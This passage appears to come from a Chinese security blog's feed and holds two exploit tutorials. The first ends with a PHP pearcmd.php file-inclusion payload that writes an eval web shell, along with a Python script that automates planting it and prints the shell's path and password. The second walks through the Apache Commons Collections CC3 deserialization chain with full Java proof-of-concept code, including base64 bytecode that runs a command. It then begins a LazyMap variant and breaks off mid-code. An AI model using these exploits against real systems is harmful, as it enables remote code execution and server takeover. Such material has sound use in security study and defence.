class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure><h1 id="0x03不出网脚本"><a href="#0x03不出网脚本" class="headerlink" title="0x03不出网脚本"></a>0x03不出网脚本</h1><p>使用时开启burp劫包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;admire@&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auz=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">header1 = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line"><span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------添加变量区----------------------------</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">local_path=[<span class="string">&quot;/usr/local/lib/php/pearcmd&quot;</span>,<span class="string">&quot;/usr/share/pear/pearcmd&quot;</span>]  <span class="comment">#pear路径 可以自己添加</span></span><br><span class="line">download_path=<span class="string">&quot;/tmp&quot;</span> <span class="comment">#下载路径</span></span><br><span class="line">include_file=<span class="string">&quot;index.php&quot;</span><span class="comment">#含有文件包含漏洞的文件</span></span><br><span class="line">include_parms=<span class="string">&quot;file&quot;</span> <span class="comment">#参数</span></span><br><span class="line">proxy=<span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line"><span class="comment">#-------------添加变量区----------------------------</span></span><br><span class="line">s1=<span class="string">&quot;/..&quot;</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> local_path:</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        <span class="keyword">if</span> auz==<span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=<span class="string">f&quot;/<span class="subst">&#123;include_file&#125;</span>?+config-create+/&amp;<span class="subst">&#123;include_parms&#125;</span>=<span class="subst">&#123;<span class="built_in">str</span>[<span class="number">1</span>:]&#125;</span><span class="subst">&#123;s&#125;</span>&amp;/&lt;?php%20phpinfo();?&gt;+<span class="subst">&#123;download_path&#125;</span>/eval.php&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        url1=url+(payload)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)<span class="comment">#自己可以改</span></span><br><span class="line"></span><br><span class="line">        re=requests.get(url=url1,headers=header1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Successfully created&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="comment">#print(checking)</span></span><br><span class="line">            <span class="comment">#burp抓包后修改url编码后的数据</span></span><br><span class="line">            os.environ[<span class="string">&quot;http_proxy&quot;</span>] = proxy</span><br><span class="line">            os.environ[<span class="string">&quot;https_proxy&quot;</span>] = proxy</span><br><span class="line">            exp=<span class="string">f&quot;/<span class="subst">&#123;include_file&#125;</span>?+config-create+/&amp;<span class="subst">&#123;include_parms&#125;</span>=<span class="subst">&#123;<span class="built_in">str</span>[<span class="number">1</span>:]&#125;</span><span class="subst">&#123;s&#125;</span>&amp;/&lt;?=eval($_REQUEST[1]);?&gt;+<span class="subst">&#123;download_path&#125;</span>/dada.php&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(url+exp)</span><br><span class="line">            rce=requests.get(url=url+exp,headers=header1)</span><br><span class="line">            path=<span class="string">f&quot;/<span class="subst">&#123;include_file&#125;</span>?<span class="subst">&#123;include_parms&#125;</span>=<span class="subst">&#123;<span class="built_in">str</span>[<span class="number">1</span>:]&#125;</span><span class="subst">&#123;download_path&#125;</span>/dada&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;木马路径&quot;</span>+url+path)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;password: 1&quot;</span>)</span><br><span class="line">            auz=<span class="literal">True</span> <span class="comment">#注释掉会一直跑下去。直到遍历结束</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:<span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">str</span> += s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;现实告诉我必须burp发包才可以写马！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-利用条件&quot;&gt;&lt;a href=&quot;#0x00-利用条件&quot; class=&quot;headerlink&quot; title=&quot;0x00 利用条件&quot;&gt;&lt;/a&gt;0x00 利用条件&lt;/h1&gt;&lt;p&gt;(1）服务器上安装pear，也就是存在pearcmd.php。同时知道pearcmd</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CC3和CC4</title>
    <link href="http://example.com/2023/04/06/CC3%E5%92%8CCC4/"/>
    <id>http://example.com/2023/04/06/CC3%E5%92%8CCC4/</id>
    <published>2023-04-06T07:19:39.000Z</published>
    <updated>2023-04-21T08:01:24.674Z</updated>
    
    <content type="html"><![CDATA[<p>CC3链是基于前面的CC2链和CC1链改造而来的</p><h2 id="复习一下"><a href="#复习一下" class="headerlink" title="复习一下"></a>复习一下</h2><ol><li><p><code>ConstantTransformer</code></p><p>ConstantTransformer，调用该类的transform方法返回传入对象本身。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>InvokerTransformer</code></p><p>InvokerTransformer，其transform方法能通过invoke执行输入的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    </span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();    </span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);  </span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);    &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>ChainedTransformer</code></p><p>它的transform方法能调用链中所有的transform方法，并且将前一个transform的输出作为当前transform的输入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;  </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">     object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>在开始之前先写</p><h2 id="TrAXFilter类的构造方法"><a href="#TrAXFilter类的构造方法" class="headerlink" title="TrAXFilter类的构造方法"></a>TrAXFilter类的构造方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    <span class="comment">//调用核心利用代码</span></span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到newTransformer 想到赋值templates为被增加了恶意类的TemplatesImpl</p><p>于是构造利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                       <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                       <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>这里使用一个InstantiateTransformer来对templates进行赋值</p><h2 id="InstantiateTransformer的构造方法"><a href="#InstantiateTransformer的构造方法" class="headerlink" title="InstantiateTransformer的构造方法"></a>InstantiateTransformer的构造方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="InstantiateTransformer类的tranform方法"><a href="#InstantiateTransformer类的tranform方法" class="headerlink" title="InstantiateTransformer类的tranform方法"></a>InstantiateTransformer类的tranform方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">//不是class对象则抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取构造器</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="comment">//实例化对象</span></span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"> </span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>接下来就是利用出口类进行触发</p><h1 id="基于TransformedMap的CC3链"><a href="#基于TransformedMap的CC3链" class="headerlink" title="基于TransformedMap的CC3链"></a>基于TransformedMap的CC3链</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Setvalue</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造核心利用代码</span></span><br><span class="line">       </span><br><span class="line">        <span class="type">byte</span> [] bytes =Base64.decode(<span class="string">&quot;yv66vgAAADQAHAEABEV2aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACAEADVN0YWNrTWFwVGFibGUBABFqYXZhL2xhbmcvUnVudGltZQcACwEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA0ADgoADAAPAQAEY2FsYwgAEQEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABMAFAoADAAVAQAGPGluaXQ+DAAXAAYKAAQAGAEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEAIQACAAQAAAAAAAIACAAFAAYAAQAHAAAAMgACAAEAAAARuAAQEhK2ABZXpwAHS6cAA7EAAQAAAAkADAAJAAEACgAAAAcAAkwHAAkDAAEAFwAGAAEABwAAABEAAQABAAAABSq3ABmxAAAAAAABABoAAAACABs=&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> templatesImpl.getClass();</span><br><span class="line">        Field _name=clz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> clz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//触发利用链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span>  <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(java.lang.annotation.Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//  序列化与反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(instance);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">AbstractInputCheckedMapDecorator.setValue()</span><br><span class="line"> TransformedMap.checkSetValue()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line"> InstantiateTransformer.tranform()</span><br><span class="line"> </span><br><span class="line">TestTemplatesImpl-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()+newInstance()</span><br></pre></td></tr></table></figure><h1 id="基于lazyMap的CC3链"><a href="#基于lazyMap的CC3链" class="headerlink" title="基于lazyMap的CC3链"></a>基于lazyMap的CC3链</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *                               基于LazyMap利用链的CC3链</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Test2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span 